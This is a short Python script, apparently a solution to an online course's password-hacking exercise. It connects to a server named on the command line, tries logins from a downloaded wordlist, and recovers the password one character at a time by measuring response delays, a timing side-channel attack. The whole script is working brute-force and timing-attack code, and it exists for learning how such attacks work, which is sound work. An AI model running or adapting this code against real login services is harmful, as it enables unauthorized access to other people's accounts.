# write your code here
import json
import socket
import string
import sys
from datetime import datetime
from urllib.request import urlopen


def get_pass_file():
    url = 'https://stepik.org/media/attachments/lesson/255258/passwords.txt'
    return urlopen(url).read().decode().split()


def get_login_file():
    url = 'https://stepik.org/media/attachments/lesson/255258/logins.txt'
    return urlopen(url).read().decode().split()


def get_login():
    yield from get_login_file()


def get_bugged_pass(start):
    for c in string.ascii_letters + string.digits:
        yield start + c


if len(sys.argv) < 3:
    raise AttributeError("2 params are required")
address = sys.argv[1]
port = int(sys.argv[2])

with socket.socket() as client:
    client.connect((address, port))
    obj = {'login': '', 'password': ''}
    login_gen = get_login()
    pw_gen = get_bugged_pass('')
    while True:
        message = json.dumps(obj)
        begin = datetime.now()
        client.send(message.encode())
        response = client.recv(1024).decode()
        end = datetime.now()
        lag = end - begin
        result = json.loads(response)["result"]
        if result == "Connection success!":
            break
        elif result == "Wrong login!":
            obj['login'] = next(login_gen)
        elif result == "Wrong password!":
            if lag.microseconds < 10000:
                obj['password'] = next(pw_gen)
            else:
                pw_gen = get_bugged_pass(obj['password'])
                obj['password'] = next(pw_gen)
    print(json.dumps(obj))
